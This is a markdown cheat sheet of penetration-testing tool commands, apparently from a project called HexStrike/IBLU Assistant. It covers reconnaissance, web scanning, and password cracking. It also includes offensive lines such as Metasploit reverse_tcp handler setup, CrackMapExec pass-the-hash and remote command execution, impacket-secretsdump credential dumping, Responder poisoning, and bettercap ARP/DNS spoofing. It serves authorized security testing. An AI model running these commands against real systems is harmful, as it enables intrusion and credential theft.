# 🚀 HexStrike Tools Quick Reference Card

## 🕵️ OSINT & Reconnaissance

```bash
# theHarvester - Email & subdomain gathering
theharvester -d target.com -b all
theharvester -d target.com -b google,linkedin -f output.html

# Amass - DNS enumeration
amass enum -d target.com
amass enum -passive -d target.com -o subs.txt

# SpiderFoot - Automated OSINT
spiderfoot -l 127.0.0.1:5001
spiderfoot -s target.com -t DOMAIN

# Shodan - Internet intelligence
shodan search apache
shodan host 8.8.8.8
```

## 🌐 Web Application Testing

```bash
# WhatWeb - Technology fingerprinting
whatweb https://target.com
whatweb -a 3 https://target.com

# HTTPx - Fast HTTP probing
cat urls.txt | httpx -tech-detect -status-code
httpx -l targets.txt -title -follow-redirects

# XSStrike - XSS detection
python3 xsstrike.py -u "http://target.com/search?q=test"
python3 xsstrike.py -u "http://target.com" --crawl

# Commix - Command injection
python3 commix.py --url="http://target.com/page?id=1"
python3 commix.py --url="http://target.com" --data="user=admin"

# Arjun - Parameter discovery
arjun -u https://target.com/api
arjun -u https://target.com -m POST
```

## 🛡️ Vulnerability Scanning

```bash
# Nuclei - Fast vulnerability scanner
nuclei -u https://target.com
nuclei -l targets.txt -severity critical,high
nuclei -u https://target.com -t cves/

# Nikto - Web server scanner
nikto -h http://target.com
nikto -h http://target.com -p 80,443,8080
```

## 💣 Exploitation

```bash
# SearchSploit - Exploit database
searchsploit apache 2.4
searchsploit --cve 2021-44228
searchsploit -m 12345

# CrackMapExec - AD exploitation
crackmapexec smb 192.168.1.0/24
crackmapexec smb 192.168.1.10 -u admin -p password
crackmapexec smb 192.168.1.10 -u admin -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u admin -p pass -x "whoami"

# Metasploit
msfconsole
search apache
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

## 🎯 Post-Exploitation

```bash
# BloodHound - AD attack paths
bloodhound
./SharpHound.exe --CollectionMethod All

# Responder - LLMNR poisoning
responder -I eth0
responder -I eth0 -A

# Impacket - Protocol exploitation
impacket-psexec domain/user:pass@192.168.1.10
impacket-secretsdump domain/user:pass@192.168.1.10
impacket-GetNPUsers domain/ -usersfile users.txt
```

## 🔬 Forensics

```bash
# Plaso - Timeline creation
log2timeline.py timeline.plaso /path/to/image
psort.py -o l2tcsv timeline.plaso -w timeline.csv

# Bulk Extractor - Artifact extraction
bulk_extractor -o output_dir disk_image.dd
bulk_extractor -o output -e email,url disk_image.dd

# Foremost - File carving
foremost -i disk_image.dd -o output_dir
foremost -t jpg,pdf,doc -i disk_image.dd -o output
```

## 📡 Wireless Attacks

```bash
# Reaver - WPS attacks
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K

# Bettercap - Modern MITM
sudo bettercap -iface eth0
# Then: net.probe on, arp.spoof on, dns.spoof on

# Aircrack-ng - Wireless suite
airmon-ng start wlan0
airodump-ng wlan0mon
aircrack-ng -w wordlist.txt capture.cap
```

## ⚙️ Utilities

```bash
# tmux - Session management
tmux new -s pentest
tmux attach -t pentest
tmux ls

# Proxychains - Route through proxies
proxychains4 nmap -sT 192.168.1.10
proxychains4 curl https://target.com

# Chisel - TCP tunneling
chisel server -p 8080 --reverse
chisel client SERVER:8080 R:3000:localhost:3000

# SSHuttle - VPN over SSH
sshuttle -r user@server 192.168.1.0/24
sshuttle -r user@server --auto-nets
```

## 🔐 Password Attacks

```bash
# Hydra - Online brute force
hydra -l admin -P passwords.txt ssh://target.com
hydra -L users.txt -P pass.txt target.com http-post-form

# John the Ripper
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt

# Hashcat
hashcat -m 0 -a 0 hashes.txt wordlist.txt
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

## 📊 Common Workflows

### Quick Recon
```bash
theharvester -d target.com -b all
amass enum -d target.com -o subs.txt
cat subs.txt | httpx -tech-detect -status-code
nuclei -l subs.txt -severity high,critical
```

### Web App Testing
```bash
whatweb -a 3 https://target.com
arjun -u https://target.com/api
nuclei -u https://target.com
python3 xsstrike.py -u "https://target.com" --crawl
```

### AD Pentest
```bash
crackmapexec smb 192.168.1.0/24
responder -I eth0
./SharpHound.exe --CollectionMethod All
bloodhound
```

## 🎯 One-Liners

```bash
# Find live hosts and probe
nmap -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}' | httpx

# Subdomain enum + tech detection
amass enum -d target.com | httpx -tech-detect -title

# Quick vuln scan
echo "https://target.com" | nuclei -severity critical,high

# AD user enumeration
crackmapexec smb 192.168.1.10 -u '' -p '' --users

# Extract emails from disk
bulk_extractor -o output -e email disk.dd
```

## 💡 Pro Tips

1. **Combine tools:** `amass enum -d target.com | httpx | nuclei`
2. **Use tmux** for long-running scans
3. **Proxy sensitive scans** with proxychains
4. **Document with Faraday** for team collaboration
5. **Always test in lab** before production
6. **Get authorization** in writing

## 🔗 Access Tools in IBLU Assistant

```bash
# Start IBLU Assistant
python3 iblu_assistant.py

# Use tools via commands
/theharvester
/amass
/httpx
/nuclei
/crackmapexec
/bloodhound

# List all tools
/tools

# Get help
/help
```

---

**Quick Install:** `sudo ./install_hexstrike_tools.sh`
**Full Guide:** See `ADVANCED_TOOLS_GUIDE.md`
